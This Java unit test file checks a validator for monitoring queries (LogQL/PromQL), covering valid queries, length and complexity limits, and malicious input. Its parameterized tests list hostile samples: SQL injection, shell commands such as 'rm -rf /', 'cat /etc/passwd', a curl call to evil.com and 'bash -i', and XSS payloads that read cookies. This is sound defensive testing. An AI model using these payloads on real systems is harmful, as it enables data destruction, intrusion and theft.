package cz.muriel.core.monitoring.bff.validation;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Unit tests for MonitoringDSLValidator
 * 
 * Tests guardrails:
 * - Valid LogQL/PromQL patterns
 * - Injection attack prevention
 * - Query complexity limits
 * - Malicious patterns detection
 */
class MonitoringDSLValidatorTest {

    private final MonitoringDSLValidator validator = new MonitoringDSLValidator();

    @Test
    void shouldAcceptValidLogQLQuery() {
        String query = "{namespace=\"production\", app=\"api\"} |= \"error\" | json | line_format \"{{.message}}\"";
        
        List<String> errors = validator.validate(query);
        
        assertThat(errors).isEmpty();
    }

    @Test
    void shouldAcceptValidPromQLQuery() {
        String query = "rate(http_requests_total{job=\"api-server\"}[5m])";
        
        List<String> errors = validator.validate(query);
        
        assertThat(errors).isEmpty();
    }

    @Test
    void shouldAcceptMetricAggregation() {
        String query = "sum by (instance) (up)";
        
        List<String> errors = validator.validate(query);
        
        assertThat(errors).isEmpty();
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "{app=\"test\"} | DROP TABLE users --",
        "{app=\"test\"} | DELETE FROM logs WHERE 1=1",
        "{app=\"test\"} | UPDATE metrics SET value=0",
        "{app=\"test\"} | INSERT INTO logs VALUES (1, 'hacked')",
        "'; DROP TABLE users; --"
    })
    void shouldRejectSQLInjectionAttempts(String maliciousQuery) {
        List<String> errors = validator.validate(maliciousQuery);
        
        assertThat(errors)
            .isNotEmpty()
            .anyMatch(error -> error.contains("SQL") || error.contains("injection"));
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "{app=\"test\"} | rm -rf /",
        "{app=\"test\"} | cat /etc/passwd",
        "{app=\"test\"} | curl http://evil.com/exfiltrate",
        "{app=\"test\"} && bash -i",
        "$(whoami)"
    })
    void shouldRejectCommandInjectionAttempts(String maliciousQuery) {
        List<String> errors = validator.validate(maliciousQuery);
        
        assertThat(errors)
            .isNotEmpty()
            .anyMatch(error -> error.contains("command") || error.contains("shell"));
    }

    @Test
    void shouldRejectQueryWithExcessiveComplexity() {
        // Deeply nested query that could cause DoS
        StringBuilder complexQuery = new StringBuilder("{app=\"test\"}");
        for (int i = 0; i < 100; i++) {
            complexQuery.append(" | json | line_format \"{{.field").append(i).append("}}\"");
        }
        
        List<String> errors = validator.validate(complexQuery.toString());
        
        assertThat(errors)
            .isNotEmpty()
            .anyMatch(error -> error.contains("complex") || error.contains("limit"));
    }

    @Test
    void shouldRejectQueryExceedingMaxLength() {
        String veryLongQuery = "{app=\"test\"} |= \"" + "x".repeat(10000) + "\"";
        
        List<String> errors = validator.validate(veryLongQuery);
        
        assertThat(errors)
            .isNotEmpty()
            .anyMatch(error -> error.contains("length") || error.contains("too long"));
    }

    @Test
    void shouldRejectNullQuery() {
        List<String> errors = validator.validate(null);
        
        assertThat(errors)
            .isNotEmpty()
            .anyMatch(error -> error.contains("null") || error.contains("empty"));
    }

    @Test
    void shouldRejectEmptyQuery() {
        List<String> errors = validator.validate("");
        
        assertThat(errors)
            .isNotEmpty()
            .anyMatch(error -> error.contains("empty"));
    }

    @Test
    void shouldRejectBlankQuery() {
        List<String> errors = validator.validate("   ");
        
        assertThat(errors)
            .isNotEmpty()
            .anyMatch(error -> error.contains("empty") || error.contains("blank"));
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "<script>alert('xss')</script>",
        "{app=\"test\"} | <img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "{app=\"test\"} | <iframe src=\"evil.com\"></iframe>"
    })
    void shouldRejectXSSAttempts(String maliciousQuery) {
        List<String> errors = validator.validate(maliciousQuery);
        
        assertThat(errors)
            .isNotEmpty()
            .anyMatch(error -> error.contains("XSS") || error.contains("script") || error.contains("HTML"));
    }

    @Test
    void shouldAcceptQueriesWithSpecialCharactersInLabels() {
        String query = "{app=\"my-app\", version=\"v1.2.3-beta\", namespace=\"prod/us-east-1\"}";
        
        List<String> errors = validator.validate(query);
        
        assertThat(errors).isEmpty();
    }

    @Test
    void shouldAcceptQueriesWithRegexMatchers() {
        String query = "{app=~\"api-.*\", status!~\"5..\"}";
        
        List<String> errors = validator.validate(query);
        
        assertThat(errors).isEmpty();
    }

    @Test
    void shouldRejectInvalidBraceBalance() {
        String query = "{app=\"test\" | json";
        
        List<String> errors = validator.validate(query);
        
        assertThat(errors)
            .isNotEmpty()
            .anyMatch(error -> error.contains("brace") || error.contains("bracket") || error.contains("syntax"));
    }
}
